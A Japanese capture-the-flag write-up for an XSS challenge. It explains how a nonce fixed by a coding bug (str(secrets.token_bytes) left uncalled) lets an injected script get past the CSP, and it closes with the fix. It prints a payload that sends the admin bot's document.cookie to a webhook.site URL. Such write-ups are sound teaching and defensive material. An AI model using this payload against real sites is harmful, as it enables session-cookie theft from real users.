# Hello Programmer!

## / Overview

## / Writeup

Admin Bot 系のチャレンジは`bot`のCookieを外部にリークさせるのがゴールです。

`bot`はユーザから指定されたURLにアクセスしレスポンスの状態を出力しますが、接続できるのは同ネットワーク内に存在する`web`コンテナだけなので、ここが攻撃の起点になります。

では`web`で何ができるのか調べます。初期状態で画面上には`Hello Programmer!`と表示されていますが、この`programmer`の部分はクエリストリングで任意の値に書き換えることができます。例えばURLの末尾に`?username=bob`とすると、画面に`Hello bob!`と出力されるのが確認できます。

典型的なXSSの問題では`username`にスクリプトタグやimgタグを設定することでhtmlソースコード内にスクリプトを埋め込むのですが、今回はContents Security Policyが以下のように厳密に設定されているためスクリプトは無効化されます。

```js
@app.after_request
def set_csp(response):
    # Content Security Policy (CSP) is an HTTP response header that restricts which resources a browser can load or execute.
    # Here, resources are denied by default. Inline script and style tags are allowed only if they have the matching nonce.

    # Content Security Policy (CSP) は、ブラウザがどのリソースを読み込み・実行できるかを制限する HTTP レスポンスヘッダです。
    # ここでは、デフォルトですべてのリソースを拒否しますが、インラインの script/style タグは、対応する nonce を持つ場合に限り許可されます。

    nonce = g.get("nonce")
    response.headers["Content-Security-Policy"] = (
        "default-src 'none'; "
        f"script-src 'nonce-{nonce}'; "
        f"style-src 'nonce-{nonce}'; "
        "object-src 'none'; "
        "base-uri 'none'; "
        "frame-ancestors 'none'"
    )

    return response
```

しかしコメントにもあるように、サーバが発行する正しいnonce値を設定しているスクリプトタグやスタイルタグは許可されています。つまりこのnonceさえ分かれば任意のスクリプトを実行できるということです。

nonceは本来ページ更新の度に新しい値がセットするため予測することはできませんが、今回のチャレンジでは何度更新しても同じ値になっていることに気付きました。具体的にはhtmlソースコード内に元々ある処理

```html
<script nonce="PGZ1bmN0aW9uIHRva2VuX2J5dGVzIGF0IDB4N2ZlODQ5M2M5ZmUwPg==" defer>
    const h1 = document.querySelector("h1");
    h1.addEventListener("click", () => {
        alert(h1.textContent);
    })
</script>
```

にセットされている値は固定です。そのため同じnonceをセットしたスクリプトタグを挿入すれば実行されます。後は定石通り`webhook`で待ち受けサーバを作り、`bot`にCookieを結合したURLを指定し、遷移させます。

注意点として文字列の結合`+`はURLエンコーディングにより空白として解釈されてしまうため代わりに`%2B`を使います。

以下ののペイロードを自分の`webhook`URLに置き換えて送信するとURL宛にフラグが届きます。

```
?username=<script nonce="PGZ1bmN0aW9uIHRva2VuX2J5dGVzIGF0IDB4N2ZlODQ5M2M5ZmUwPg==">location.href = "https://webhook.site/550e8400-e29b-41d4-a716-446655440000?cookie="%2Bdocument.cookie</script>
```

なぜnonceが固定になってしまったかはbase64デコードすると分かります。

```
<function token_bytes at 0x7fe8493c9fe0>
```

本来は`str(secrets.token_bytes(16))`としなければならない所を`str(secrets.token_bytes)`としてしまったため、関数自体が文字列化されてしまい正しくランダムなnonceになりませんでした。したがって`str(secrets.token_bytes(16))`と直すと解決します。